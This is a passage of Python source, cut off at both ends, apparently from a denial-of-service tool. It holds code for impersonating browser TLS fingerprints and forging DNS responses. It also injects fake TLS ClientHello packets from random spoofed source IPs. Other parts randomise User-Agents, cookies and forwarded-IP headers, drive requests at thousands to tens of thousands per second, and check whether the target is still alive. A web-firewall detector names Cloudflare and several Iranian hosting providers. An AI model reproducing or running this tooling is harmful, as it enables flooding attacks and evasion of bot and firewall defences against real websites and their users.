    "/v1/explorer", "/__graphql", "/graphql/console/",
]
DEFAULT_GRAPHQL_FALLBACK = ["/graphql", "/api/graphql", "/v1/graphql", "/gql"]

CHROME_HEADER_ORDER = [
    "Host", "Connection", "sec-ch-ua", "sec-ch-ua-mobile", "sec-ch-ua-platform",
    "Upgrade-Insecure-Requests", "User-Agent", "Accept", "Sec-Fetch-Site",
    "Sec-Fetch-Mode", "Sec-Fetch-User", "Sec-Fetch-Dest", "Accept-Encoding",
    "Accept-Language", "Cookie"
]

CHROME_133_SETTINGS = "1:65536;2:0;3:1000;4:6291456;5:16384;6:262144"
CHROME_133_WINDOW_UPDATE = "15663105"

# ============================================================================
# ExtraFingerprints
# ============================================================================
def build_chrome_fp():
    return {
        "tls_grease": True, "tls_permute_extensions": True, "tls_cert_compression": "brotli",
        "tls_signature_algorithms": [
            "ecdsa_secp256r1_sha256", "rsa_pss_rsae_sha256", "rsa_pkcs1_sha256",
            "ecdsa_secp384r1_sha384", "ecdsa_sha1", "rsa_pss_rsae_sha384",
            "rsa_pkcs1_sha384", "rsa_pss_rsae_sha512", "rsa_pkcs1_sha512", "rsa_pkcs1_sha1",
        ],
        "http2_stream_weight": 256, "http2_stream_exclusive": 1, "http2_no_priority": True,
    }

def build_firefox_fp():
    return {
        "tls_grease": True, "tls_permute_extensions": True, "tls_cert_compression": "zlib",
        "http2_stream_weight": 42, "http2_stream_exclusive": 0, "http2_no_priority": False,
    }

def build_safari_fp():
    return {
        "tls_grease": False, "tls_permute_extensions": False, "tls_cert_compression": "zlib",
        "http2_stream_weight": 255, "http2_stream_exclusive": 0, "http2_no_priority": True,
    }

_FP_CACHE = {}

def get_extra_fp_dict(impersonate):
    if not CURL_CFFI_AVAILABLE:
        return None
    imp_lower = impersonate.lower()
    if impersonate in _FP_CACHE:
        return _FP_CACHE[impersonate]
    if "chrome" in imp_lower or "edge" in imp_lower:
        fp = build_chrome_fp()
    elif "firefox" in imp_lower:
        fp = build_firefox_fp()
    elif "safari" in imp_lower:
        fp = build_safari_fp()
    else:
        fp = build_chrome_fp()
    _FP_CACHE[impersonate] = fp
    return fp

# ============================================================================
# JA3 / Akamai profiles
# ============================================================================
CHROME_JA3 = "771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,11-23-10-35-43-17613-45-5-0-51-65281-13-65037-16-27-18-41,4588-29-23-24,0"
CHROME_AKAMAI = "1:65536;2:0;3:1000;4:6291456;5:16384;6:262144|15663105|0|m,a,s,p"
FIREFOX_JA3 = "771,4865-4867-4866-49195-49199-52393-52392-49196-49200-49162-49161-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-34-51-43-13-45-28-65037,29-23-24-25-256-257,0"
FIREFOX_AKAMAI = "1:65536;2:0;4:131072;5:16384|12517377|3:0:0:201,5:0:0:101,7:0:0:1,9:0:0:1,11:0:0:1,13:0:0:1|m,p,a,s"
SAFARI_JA3 = "771,4865-4866-4867-49196-49195-52393-49200-49199-52392-49188-49187-49162-49161-49192-49191-49172-49171-157-156-61-60-53-47-49160-49170-10,65281-0-23-13-5-18-16-11-51-45-43-27-21,29-23-24-25,0"
SAFARI_AKAMAI = "1:65536;2:0;4:4194304;5:16384|10420225|0|m,s,a,p"
EDGE_JA3 = "771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,11-23-10-35-43-17613-45-5-0-51-65281-13-65037-16-27-18-41,4588-29-23-24,0"
EDGE_AKAMAI = "1:65536;2:0;3:1000;4:6291456;5:16384;6:262144|15663105|0|m,a,s,p"

JA3_PROFILES = {}
AKAMAI_PROFILES = {}

for _v in ["chrome", "chrome99", "chrome100", "chrome101", "chrome104", "chrome107",
           "chrome110", "chrome116", "chrome119", "chrome120", "chrome123", "chrome124",
           "chrome131", "chrome133a", "chrome136", "chrome142", "chrome145", "chrome146"]:
    JA3_PROFILES[_v] = CHROME_JA3
    AKAMAI_PROFILES[_v] = CHROME_AKAMAI

for _v in ["firefox", "firefox133", "firefox135", "firefox144", "firefox147"]:
    JA3_PROFILES[_v] = FIREFOX_JA3
    AKAMAI_PROFILES[_v] = FIREFOX_AKAMAI

for _v in ["safari", "safari153", "safari155", "safari170", "safari172_ios",
           "safari180", "safari184", "safari260", "safari260_ios"]:
    JA3_PROFILES[_v] = SAFARI_JA3
    AKAMAI_PROFILES[_v] = SAFARI_AKAMAI

for _v in ["edge", "edge99", "edge101"]:
    JA3_PROFILES[_v] = EDGE_JA3
    AKAMAI_PROFILES[_v] = EDGE_AKAMAI

# ============================================================================
# v65.1: DNSSpoofer
# ============================================================================
class DNSSpoofer:
    def __init__(self, target_ip=None, spoof_ip=None):
        self.target_ip = target_ip
        self.spoof_ip = spoof_ip or "127.0.0.1"

    def build_spoof_response(self, query_packet, spoof_ip=None):
        if not SCAPY_AVAILABLE:
            return None
        try:
            spoof_ip = spoof_ip or self.spoof_ip
            ip = query_packet[IP]; udp = query_packet[UDP]; dns = query_packet[DNS]
            spoofed = (IP(src=ip.dst, dst=ip.src) / UDP(sport=udp.dport, dport=udp.sport) /
                       DNS(id=dns.id, qr=1, aa=1, qd=dns.qd, an=DNSRR(rrname=dns.qd.qname, rdata=spoof_ip)))
            return spoofed
        except Exception:
            return None

    def send_spoof_response(self, query_packet, spoof_ip=None):
        if not SCAPY_AVAILABLE:
            return False
        try:
            spoofed = self.build_spoof_response(query_packet, spoof_ip)
            if spoofed:
                send(spoofed, verbose=False)
                return True
        except Exception:
            pass
        return False

# ============================================================================
# v65.1: SNI Spoofer
# ============================================================================
class SNISpoofer:
    @staticmethod
    def build_fake_client_hello(sni_host, seq_num, ack_num):
        if not SCAPY_AVAILABLE:
            return None
        try:
            sni_bytes = sni_host.encode()
            hello = (
                b"\x16\x03\x01" + struct.pack(">H", 0) + b"\x01" + b"\x00\x00\x00" +
                b"\x03\x03" + os.urandom(32) + b"\x00" + b"\x00\x02\x00\x2f" + b"\x01\x00" +
                struct.pack(">H", 5 + len(sni_bytes)) + b"\x00\x00" +
                struct.pack(">H", 5 + len(sni_bytes)) +
                struct.pack(">H", 3 + len(sni_bytes)) + b"\x00" +
                struct.pack(">H", len(sni_bytes)) + sni_bytes
            )
            hello = hello[:3] + struct.pack(">H", len(hello) - 5) + hello[5:]
            hello = hello[:6] + struct.pack(">I", len(hello) - 9)[1:] + hello[9:]
            return hello
        except Exception:
            return None

    @staticmethod
    def inject(sock, sni_host, seq_num, ack_num, dst_ip, dst_port):
        if not SCAPY_AVAILABLE:
            return False
        try:
            fake_hello = SNISpoofer.build_fake_client_hello(sni_host, seq_num, ack_num)
            if not fake_hello:
                return False
            src_ip = f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
            ip = IP(src=src_ip, dst=dst_ip, ttl=random.randint(1, 3))
            tcp = TCP(sport=random.randint(1024, 65535), dport=dst_port, seq=seq_num, ack=ack_num, flags="PA")
            send(ip / tcp / Raw(fake_hello), verbose=False)
            return True
        except Exception:
            return False

# ============================================================================
# FastUAGenerator
# ============================================================================
class FastUAGenerator:
    CHROME_VERSIONS = list(range(99, 147))
    CHROME_BUILDS = {
        "99": "4844.0", "100": "4896.127", "101": "4951.0", "102": "5005.63",
        "103": "5060.0", "104": "5112.0", "105": "5152.0", "106": "5203.0",
        "107": "5249.0", "108": "5359.0", "109": "5414.0", "110": "5481.0",
        "111": "5563.0", "112": "5615.0", "113": "5672.0", "114": "5735.0",
        "115": "5790.0", "116": "5845.0", "117": "5938.0", "118": "5993.0",
        "119": "6045.0", "120": "6099.0", "121": "6167.0", "122": "6261.0",
        "123": "6312.0", "124": "6367.0", "125": "6422.0", "126": "6478.0",
        "127": "6533.0", "128": "6613.0", "129": "6668.0", "130": "6723.0",
        "131": "6778.0", "132": "6834.0", "133": "6943.0", "134": "6998.0",
        "135": "7049.0", "136": "7103.0", "137": "7151.0", "138": "7204.0",
        "139": "7258.0", "140": "7312.0", "141": "7368.0", "142": "7421.0",
        "143": "7477.0", "144": "7532.0", "145": "7588.0", "146": "7643.0",
    }
    CHROME_WEBKIT = "537.36"
    CHROME_PLATFORMS = {
        "win": ["Windows NT 10.0; Win64; x64", "Windows NT 10.0; WOW64",
                "Windows NT 6.1; Win64; x64", "Windows NT 6.3; Win64; x64"],
        "mac": ["Macintosh; Intel Mac OS X 10_15_7", "Macintosh; Intel Mac OS X 11_7_10",
                "Macintosh; Intel Mac OS X 12_7_6", "Macintosh; Intel Mac OS X 13_6_4"],
        "linux": ["X11; Linux x86_64", "X11; Ubuntu; Linux x86_64",
                  "X11; Fedora; Linux x86_64", "X11; Debian; Linux x86_64"],
    }
    CHROME_MOBILE_PLATFORMS = {
        "android": ["Linux; Android 10; SM-A505F", "Linux; Android 11; Pixel 5",
                    "Linux; Android 12; SM-G991B", "Linux; Android 13; Pixel 7",
                    "Linux; Android 14; SM-S918B", "Linux; Android 14; Pixel 8"],
    }
    FIREFOX_VERSIONS = list(range(100, 148))
    FIREFOX_PLATFORMS = {
        "win": ["Windows NT 10.0; Win64; x64", "Windows NT 10.0; WOW64"],
        "mac": ["Macintosh; Intel Mac OS X 10.15", "Macintosh; Intel Mac OS X 11.7"],
        "linux": ["X11; Linux x86_64", "X11; Ubuntu; Linux x86_64"],
    }
    SAFARI_VERSIONS = list(range(15, 27))
    SAFARI_PLATFORMS = {
        "mac": ["Macintosh; Intel Mac OS X 10_15_7", "Macintosh; Intel Mac OS X 11_7_10",
                "Macintosh; Intel Mac OS X 12_7_6", "Macintosh; Intel Mac OS X 13_6_4",
                "Macintosh; Intel Mac OS X 14_4_0", "Macintosh; Intel Mac OS X 15_0_0"],
        "ios": ["iPhone; CPU iPhone OS 15_7 like Mac OS X", "iPhone; CPU iPhone OS 16_6 like Mac OS X",
                "iPhone; CPU iPhone OS 17_2 like Mac OS X", "iPhone; CPU iPhone OS 18_0 like Mac OS X"],
    }
    EDGE_VERSIONS = list(range(99, 132))
    EDGE_BUILDS = {
        "99": "0.1155.48", "100": "0.1185.39", "101": "0.1210.39",
        "102": "0.1245.33", "103": "0.1264.37", "104": "0.1293.47",
        "105": "0.1343.27", "106": "0.1370.34", "107": "0.1418.24",
        "108": "0.1462.46", "109": "0.1518.49", "110": "0.1587.41",
        "111": "0.1622.29", "112": "0.1661.41", "113": "0.1709.48",
        "114": "0.1774.35", "115": "0.1823.37", "116": "0.1881.43",
        "117": "0.1933.46", "118": "0.1993.41", "119": "0.2045.35",
        "120": "0.2097.40", "121": "0.2151.46", "122": "0.2210.37",
        "123": "0.2277.49", "124": "0.2322.43", "125": "0.2381.41",
        "126": "0.2428.51", "127": "0.2486.36", "128": "0.2542.43",
        "129": "0.2595.41", "130": "0.2643.47", "131": "0.2704.38",
    }
    EDGE_WEBKIT = "537.36"

    def __init__(self, seed=None):
        self._lock = threading.Lock()
        self._counter = 0
        self._seed = seed
        if seed is not None:
            random.seed(seed)

    def _pick(self, lst):
        return lst[random.randint(0, len(lst) - 1)]

    def chrome_desktop(self):
        version = self._pick(self.CHROME_VERSIONS)
        build = self.CHROME_BUILDS.get(str(version), "0.0")
        platform = self._pick(["win", "mac", "linux"])
        plat_str = self._pick(self.CHROME_PLATFORMS[platform])
        return f"Mozilla/5.0 ({plat_str}) AppleWebKit/{self.CHROME_WEBKIT} (KHTML, like Gecko) Chrome/{version}.0.{build}.0 Safari/{self.CHROME_WEBKIT}"

    def chrome_mobile(self):
        version = self._pick(self.CHROME_VERSIONS)
        build = self.CHROME_BUILDS.get(str(version), "0.0")
        plat_str = self._pick(self.CHROME_MOBILE_PLATFORMS["android"])
        return f"Mozilla/5.0 ({plat_str}) AppleWebKit/{self.CHROME_WEBKIT} (KHTML, like Gecko) Chrome/{version}.0.{build}.0 Mobile Safari/{self.CHROME_WEBKIT}"

    def firefox_desktop(self):
        version = self._pick(self.FIREFOX_VERSIONS)
        platform = self._pick(["win", "mac", "linux"])
        plat_str = self._pick(self.FIREFOX_PLATFORMS[platform])
        return f"Mozilla/5.0 ({plat_str}; rv:{version}.0) Gecko/20100101 Firefox/{version}.0"

    def safari_desktop(self):
        version = self._pick(self.SAFARI_VERSIONS)
        plat_str = self._pick(self.SAFARI_PLATFORMS["mac"])
        webkit_ver = f"605.1.{random.randint(15, 20)}"
        return f"Mozilla/5.0 ({plat_str}) AppleWebKit/{webkit_ver} (KHTML, like Gecko) Version/{version}.{random.randint(0, 5)} Safari/{webkit_ver}"

    def safari_mobile(self):
        version = self._pick(self.SAFARI_VERSIONS)
        plat_str = self._pick(self.SAFARI_PLATFORMS["ios"])
        webkit_ver = f"605.1.{random.randint(15, 20)}"
        return f"Mozilla/5.0 ({plat_str}) AppleWebKit/{webkit_ver} (KHTML, like Gecko) Version/{version}.{random.randint(0, 5)} Mobile/15E148 Safari/604.1"

    def edge_desktop(self):
        version = self._pick(self.EDGE_VERSIONS)
        build = self.EDGE_BUILDS.get(str(version), "0.0")
        platform = self._pick(["win", "mac"])
        plat_str = self._pick(self.CHROME_PLATFORMS[platform])
        return f"Mozilla/5.0 ({plat_str}) AppleWebKit/{self.EDGE_WEBKIT} (KHTML, like Gecko) Chrome/{version}.0.0.0 Safari/{self.EDGE_WEBKIT} Edg/{version}.0.{build}"

    def random(self):
        c = random.randint(0, 5)
        if c == 0: return self.chrome_desktop()
        elif c == 1: return self.chrome_mobile()
        elif c == 2: return self.firefox_desktop()
        elif c == 3: return self.safari_desktop()
        elif c == 4: return self.safari_mobile()
        else: return self.edge_desktop()

    def generate_batch(self, count=1000):
        return [self.random() for _ in range(count)]

    def get_sec_ch_ua(self, ua):
        if "Chrome/" in ua:
            m = re.search(r'Chrome/(\d+)', ua)
            v = m.group(1) if m else "133"
            return {
                "sec-ch-ua": f'"Chromium";v="{v}", "Google Chrome";v="{v}", "Not_A Brand";v="24"',
                "sec-ch-ua-mobile": "?1" if "Mobile" in ua else "?0",
                "sec-ch-ua-platform": '"Android"' if "Android" in ua else ('"Windows"' if "Windows" in ua else '"macOS"'),
            }
        elif "Firefox/" in ua: return {}
        elif "Version/" in ua and "Safari/" in ua: return {}
        elif "Edg/" in ua:
            m = re.search(r'Edg/(\d+)', ua)
            v = m.group(1) if m else "131"
            return {
                "sec-ch-ua": f'"Microsoft Edge";v="{v}", "Chromium";v="{v}", "Not_A Brand";v="24"',
                "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
            }
        return {}

# ============================================================================
# PerRequestIdentity — v65.1
# ============================================================================
class PerRequestIdentity:
    REFERERS = [
        "https://www.google.com/", "https://www.bing.com/", "https://duckduckgo.com/",
        "https://www.facebook.com/", "https://twitter.com/", "https://www.reddit.com/",
        "https://www.instagram.com/", "https://www.youtube.com/", "https://www.linkedin.com/",
        "https://t.me/", "https://www.pinterest.com/", "https://www.tumblr.com/",
    ]
    LANGUAGES = ["en-US,en;q=0.9", "en-GB,en;q=0.8", "en-CA,en;q=0.9",
                 "en-US,en;q=0.9,es;q=0.8", "en-US,en;q=0.9,fr;q=0.8",
                 "en-US,en;q=0.9,de;q=0.8", "fa-IR,fa;q=0.9,en;q=0.8"]
    ACCEPT_TYPES = [
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    ]
    DNT_VALUES = ["1", "0"]

    def __init__(self, ua_gen=None):
        self.ua_gen = ua_gen or FastUAGenerator()
        self.lock = threading.Lock()
        self._dns_spoofer = DNSSpoofer()
        self._sni_spoofer = SNISpoofer()

    def generate(self, original_host=None):
        ua = self.ua_gen.random()
        sec_ch = self.ua_gen.get_sec_ch_ua(ua)
        headers = OrderedDict()
        if "Chrome" in ua or "Edg/" in ua:
            headers["Host"] = original_host or ""
            headers["Connection"] = "keep-alive"
            for k, v in sec_ch.items(): headers[k] = v
            headers["Upgrade-Insecure-Requests"] = "1"
            headers["User-Agent"] = ua
            headers["Accept"] = random.choice(self.ACCEPT_TYPES)
            headers["Sec-Fetch-Site"] = random.choice(["none", "same-origin", "cross-site"])
            headers["Sec-Fetch-Mode"] = "navigate"
            headers["Sec-Fetch-User"] = "?1"
            headers["Sec-Fetch-Dest"] = "document"
            headers["Accept-Encoding"] = "gzip, deflate, br"
            headers["Accept-Language"] = random.choice(self.LANGUAGES)
            cookie = self._generate_cookie()
            if cookie: headers["Cookie"] = cookie
        else:
            headers["Host"] = original_host or ""
            headers["User-Agent"] = ua
            headers["Accept"] = random.choice(self.ACCEPT_TYPES)
            headers["Accept-Language"] = random.choice(self.LANGUAGES)
            headers["Accept-Encoding"] = "gzip, deflate, br"
            headers["Connection"] = "keep-alive"
            headers["Upgrade-Insecure-Requests"] = "1"
            headers["Sec-Fetch-Dest"] = "document"
            headers["Sec-Fetch-Mode"] = "navigate"
            headers["Sec-Fetch-Site"] = random.choice(["none", "same-origin", "cross-site"])
            headers["Sec-Fetch-User"] = "?1"
            headers["DNT"] = random.choice(self.DNT_VALUES)
            cookie = self._generate_cookie()
            if cookie: headers["Cookie"] = cookie

        fake_ip = self._rand_ip()
        headers["X-Forwarded-For"] = fake_ip
        headers["X-Real-IP"] = fake_ip
        headers["X-Client-IP"] = fake_ip
        headers["True-Client-IP"] = fake_ip
        headers["CF-Connecting-IP"] = fake_ip
        headers["Forwarded"] = f"for={fake_ip};proto=https"

        return {
            "user_agent": ua, "headers": dict(headers), "sec_ch_ua": sec_ch,
            "referer": random.choice(self.REFERERS),
            "fake_ip": fake_ip, "fake_mac": self._rand_mac(),
        }

    def _generate_cookie(self):
        parts = []
        for _ in range(random.randint(1, 4)):
            name = random.choice(COOKIE_NAMES)
            val = os.urandom(random.randint(8, 24)).hex()
            parts.append(f"{name}={val}")
        return "; ".join(parts)

    def _rand_ip(self):
        return f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"

    def _rand_mac(self):
        return ":".join(f"{random.randint(0, 255):02x}" for _ in range(6))

# ============================================================================
# AdaptiveRateLimiter — v65.1
# ============================================================================
class AdaptiveRateLimiter:
    def __init__(self, base_rate=5000, burst=20000, min_rate=500, max_rate=50000):
        self.base_rate = base_rate
        self.current_rate = base_rate
        self.min_rate = min_rate
        self.max_rate = max_rate
        self.burst = burst
        self.tokens = burst
        self.last_refill = time.monotonic()
        self.lock = threading.Lock()
        self.error_window = []
        self.error_threshold = 0.8
        self.backoff_factor = 0.98
        self.recovery_factor = 1.2
        self.last_backoff = 0
        self.backoff_count = 0
        self._ssl_errors = 0
        self.backoff_threshold = 200

    def record_error(self, error_type=""):
        if "SSLError" in error_type or "SSL" in error_type:
            self._ssl_errors += 1
            return
        now = time.monotonic()
        with self.lock:
            self.error_window.append(now)
            self.error_window = [t for t in self.error_window if now - t < 5.0]
            if len(self.error_window) > self.backoff_threshold:
                if now - self.last_backoff > 3.0:
                    self.current_rate = max(self.min_rate, int(self.current_rate * self.backoff_factor))
                    self.last_backoff = now
                    self.backoff_count += 1

    def record_success(self):
        now = time.monotonic()
        with self.lock:
            if self.current_rate < self.base_rate and now - self.last_backoff > 5.0:
                self.current_rate = min(self.base_rate, int(self.current_rate * self.recovery_factor))

    def force_reduce(self, factor=0.5):
        """v65.1: external rate reduction (from NetworkHealthMonitor)."""
        with self.lock:
            self.current_rate = max(self.min_rate, int(self.current_rate * factor))
            self.backoff_count += 1

    def consume(self, tokens=1):
        with self.lock:
            now = time.monotonic()
            elapsed = now - self.last_refill
            self.tokens = min(self.burst, self.tokens + elapsed * self.current_rate)
            self.last_refill = now
            if self.tokens >= tokens:
                self.tokens -= tokens
                return True
            return False

    async def acquire(self, tokens=1):
        wait = 0.0001
        while not self.consume(tokens):
            await asyncio.sleep(wait)
            wait = min(wait * 1.5, 0.01)

    def get_rate(self):
        with self.lock:
            return self.current_rate

# ============================================================================
# RateLimiter (L4)
# ============================================================================
class RateLimiter:
    def __init__(self, rate_per_sec=500, burst=1000):
        self.rate = rate_per_sec
        self.burst = burst
        self.tokens = burst
        self.last_refill = time.monotonic()
        self.lock = threading.Lock()
    def consume(self, tokens=1):
        with self.lock:
            now = time.monotonic()
            elapsed = now - self.last_refill
            self.tokens = min(self.burst, self.tokens + elapsed * self.rate)
            self.last_refill = now
            if self.tokens >= tokens:
                self.tokens -= tokens
                return True
            return False
    async def acquire(self, tokens=1):
        wait = 0.0001
        while not self.consume(tokens):
            await asyncio.sleep(wait)
            wait = min(wait * 1.5, 0.01)

# ============================================================================
# NetworkHealthMonitor — v65.1
# ============================================================================
class NetworkHealthMonitor:
    def __init__(self, interval=5.0, min_upload_mbps=0.1, max_upload_mbps=500.0):
        self.interval = interval
        self.min_upload_mbps = min_upload_mbps
        self.max_upload_mbps = max_upload_mbps
        self.running = False
        self.thread = None
        self.lock = threading.Lock()
        self._prev = None
        self._prev_time = None
        self._baseline_bytes_sent = 0
        self._baseline_bytes_recv = 0
        self._baseline_pkts_sent = 0
        self._started = False
        self.stats = {
            "bytes_sent": 0, "bytes_recv": 0, "packets_sent": 0, "packets_recv": 0,
            "err_in": 0, "err_out": 0, "drop_in": 0, "drop_out": 0,
            "mbps_out": 0.0, "mbps_in": 0.0, "pps_out": 0.0, "pps_in": 0.0,
            "health": "OK", "paused": False,
        }
        self._consecutive_low = 0
        self._consecutive_high = 0
        self.rate_limiter = None
        self.adaptive_limiter = None

    def start(self):
        try:
            cur = psutil.net_io_counters()
            self._prev = cur
            self._prev_time = time.monotonic()
            self._baseline_bytes_sent = cur.bytes_sent
            self._baseline_bytes_recv = cur.bytes_recv
            self._baseline_pkts_sent = cur.packets_sent
        except Exception:
            return False
        self.running = True
        self.thread = threading.Thread(target=self._loop, daemon=True)
        self.thread.start()
        return True

    def activate(self):
        self._started = True

    def _loop(self):
        while self.running:
            time.sleep(self.interval)
            try:
                cur = psutil.net_io_counters()
            except Exception:
                continue
            now = time.monotonic()
            dt = max(0.001, now - self._prev_time)
            with self.lock:
                mbps_out = (cur.bytes_sent - self._prev.bytes_sent) * 8 / dt / 1e6
                mbps_in = (cur.bytes_recv - self._prev.bytes_recv) * 8 / dt / 1e6
                pps_out = (cur.packets_sent - self._prev.packets_sent) / dt
                self.stats["bytes_sent"] = cur.bytes_sent
                self.stats["bytes_recv"] = cur.bytes_recv
                self.stats["packets_sent"] = cur.packets_sent
                self.stats["packets_recv"] = cur.packets_recv
                self.stats["err_out"] = cur.errout
                self.stats["mbps_out"] = mbps_out
                self.stats["mbps_in"] = mbps_in
                self.stats["pps_out"] = pps_out

                if not self._started:
                    self._consecutive_low = 0
                    self._consecutive_high = 0
                    self.stats["health"] = "OK"
                    self.stats["paused"] = False
                else:
                    if mbps_out < self.min_upload_mbps:
                        self._consecutive_low += 1
                        if self._consecutive_low >= 3:
                            self.stats["health"] = "DEGRADED"
                            self.stats["paused"] = True
                            if self.rate_limiter:
                                self.rate_limiter.rate = max(100, int(self.rate_limiter.rate * 0.5))
                            if self.adaptive_limiter:
                                self.adaptive_limiter.force_reduce(0.5)
                    elif mbps_out > self.max_upload_mbps:
                        self._consecutive_high += 1
                        if self._consecutive_high >= 2:
                            self.stats["health"] = "SATURATED"
                            self.stats["paused"] = True
                    else:
                        self._consecutive_low = 0
                        self._consecutive_high = 0
                        self.stats["health"] = "OK"
                        self.stats["paused"] = False
            self._prev = cur
            self._prev_time = now

    def is_paused(self):
        with self.lock:
            return self.stats["paused"]

    def snapshot(self):
        with self.lock:
            return dict(self.stats)

    def total_bytes_sent(self):
        with self.lock:
            return max(0, self.stats["bytes_sent"] - self._baseline_bytes_sent)

    def total_bytes_recv(self):
        with self.lock:
            return max(0, self.stats["bytes_recv"] - self._baseline_bytes_recv)

    def total_pkts_sent(self):
        with self.lock:
            return max(0, self.stats["packets_sent"] - self._baseline_pkts_sent)

    def stop(self):
        self.running = False

# ============================================================================
# NetworkMonitor (stats only)
# ============================================================================
class NetworkMonitor:
    def __init__(self, interval=5.0):
        self.interval = interval
        self.running = False
        self.thread = None
        self.lock = threading.Lock()
        self._prev = None
        self._prev_time = None
        self._baseline_bytes_sent = 0
        self._baseline_bytes_recv = 0
        self._baseline_pkts_sent = 0
        self.stats = {"bytes_sent": 0, "bytes_recv": 0, "packets_sent": 0, "packets_recv": 0,
                      "err_in": 0, "err_out": 0, "drop_in": 0, "drop_out": 0,
                      "mbps_out": 0.0, "mbps_in": 0.0, "pps_out": 0.0, "pps_in": 0.0}
        self._err_baseline = 0

    def start(self):
        try:
            cur = psutil.net_io_counters()
            self._prev = cur
            self._prev_time = time.monotonic()
            self._baseline_bytes_sent = cur.bytes_sent
            self._baseline_bytes_recv = cur.bytes_recv
            self._baseline_pkts_sent = cur.packets_sent
            self._err_baseline = cur.errout
        except Exception:
            return False
        self.running = True
        self.thread = threading.Thread(target=self._loop, daemon=True)
        self.thread.start()
        return True
    def _loop(self):
        while self.running:
            time.sleep(self.interval)
            try:
                cur = psutil.net_io_counters()
            except Exception:
                continue
            now = time.monotonic()
            dt = max(0.001, now - self._prev_time)
            with self.lock:
                self.stats["bytes_sent"] = cur.bytes_sent
                self.stats["bytes_recv"] = cur.bytes_recv
                self.stats["packets_sent"] = cur.packets_sent
                self.stats["packets_recv"] = cur.packets_recv
                err_delta = cur.errout - self._prev.errout
                if err_delta < 100:
                    self.stats["err_out"] = cur.errout
                self.stats["mbps_out"] = (cur.bytes_sent - self._prev.bytes_sent) * 8 / dt / 1e6
                self.stats["mbps_in"] = (cur.bytes_recv - self._prev.bytes_recv) * 8 / dt / 1e6
                self.stats["pps_out"] = (cur.packets_sent - self._prev.packets_sent) / dt
            self._prev = cur
            self._prev_time = now
    def snapshot(self):
        with self.lock:
            return dict(self.stats)
    def total_bytes_sent(self):
        with self.lock:
            return max(0, self.stats["bytes_sent"] - self._baseline_bytes_sent)
    def total_bytes_recv(self):
        with self.lock:
            return max(0, self.stats["bytes_recv"] - self._baseline_bytes_recv)
    def total_pkts_sent(self):
        with self.lock:
            return max(0, self.stats["packets_sent"] - self._baseline_pkts_sent)
    def stop(self):
        self.running = False

# ============================================================================
# HealthChecker — v65.1
# ============================================================================
class HealthChecker:
    def __init__(self, target_url, interval=10.0, original_host=None, origin_ip=None, origin_port=None):
        self.target_url = target_url
        self.interval = interval
        self.original_host = original_host
        self.origin_ip = origin_ip
        self.origin_port = origin_port
        self.running = False
        self.thread = None
        self.lock = threading.Lock()
        self.status = {"alive": False, "status_code": 0, "response_ms": 0.0,
                       "error": "not checked yet", "checks_ok": 0, "checks_fail": 0}
    def start(self):
        self.running = True
        self.thread = threading.Thread(target=self._loop, daemon=True)
        self.thread.start()
        return True
    def _loop(self):
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        while self.running:
            try:
                start = time.monotonic()
                if CURL_CFFI_AVAILABLE:
                    fp = get_extra_fp_dict("chrome136")
                    kwargs = {"impersonate": "chrome136"}
                    if fp: kwargs["extra_fp"] = fp
                    s = curl_requests.Session(**kwargs)
                    if self.origin_ip and self.original_host and self.origin_port:
                        try:
                            s.curl.setopt(CurlOpt.RESOLVE, [f"{self.original_host}:{self.origin_port}:{self.origin_ip}"])
                            s.curl.setopt(CurlOpt.SSL_VERIFYHOST, 0)
                            s.curl.setopt(CurlOpt.SSL_VERIFYPEER, 0)
                        except Exception: pass
                    r = s.get(self.target_url, headers={"User-Agent": FastUAGenerator().random()},
                              timeout=4, verify=False, allow_redirects=True)
                else:
                    r = requests.get(self.target_url, headers={"User-Agent": FastUAGenerator().random()},
                                     timeout=4, verify=False, allow_redirects=True)
                elapsed_ms = (time.monotonic() - start) * 1000
                with self.lock:
                    self.status["status_code"] = r.status_code
                    self.status["response_ms"] = elapsed_ms
                    self.status["alive"] = r.status_code < 500
                    self.status["error"] = ""
                    self.status["checks_ok"] += 1
                logger.info(f"   [health] ALIVE status={r.status_code} {elapsed_ms:.0f}ms")
            except requests.exceptions.Timeout:
                with self.lock:
                    self.status["alive"] = False
                    self.status["error"] = "TIMEOUT"
                    self.status["checks_fail"] += 1
                logger.warning("   [health] DEAD (TIMEOUT)")
            except Exception as e:
                with self.lock:
                    self.status["alive"] = False
                    self.status["error"] = type(e).__name__[:30]
                    self.status["checks_fail"] += 1
                logger.warning(f"   [health] DEAD ({type(e).__name__})")
            time.sleep(self.interval)
    def snapshot(self):
        with self.lock:
            return dict(self.status)
    def stop(self):
        self.running = False

# ============================================================================
# PrivilegeChecker
# ============================================================================
class PrivilegeChecker:
    @staticmethod
    def check():
        info = {"is_root": False, "is_admin": False, "raw_socket_ok": False}
        if IS_WINDOWS:
            try: info["is_admin"] = ctypes.windll.shell32.IsUserAnAdmin() != 0
            except Exception: pass
        else:
            try: info["is_root"] = os.geteuid() == 0
            except Exception: pass
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            s.close()
            info["raw_socket_ok"] = True
        except Exception:
            info["raw_socket_ok"] = False
        return info

# ============================================================================
# WAFDetector
# ============================================================================
class WAFDetector:
    SIGS = {"cloudflare": ["cloudflare", "cf-ray"], "litespeed": ["litespeed", "lsws"],
            "nginx": ["nginx"], "apache": ["apache"], "arvancloud": ["arvancloud"],
            "parspack": ["parspack"], "afranet": ["afranet"], "hostiran": ["hostiran"]}
    @staticmethod
    def detect(url):
        try:
            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
            r = requests.get(url, timeout=10, headers={"User-Agent": FastUAGenerator().random()}, verify=False)
            hl = {k.lower(): v.lower() for k, v in r.headers.items()}
            bl = r.text[:3000].lower()
            out = []
            for waf, sigs in WAFDetector.SIGS.items():
                if any(any(s in h for h in hl.values()) or s in hl or s in bl for s in sigs):
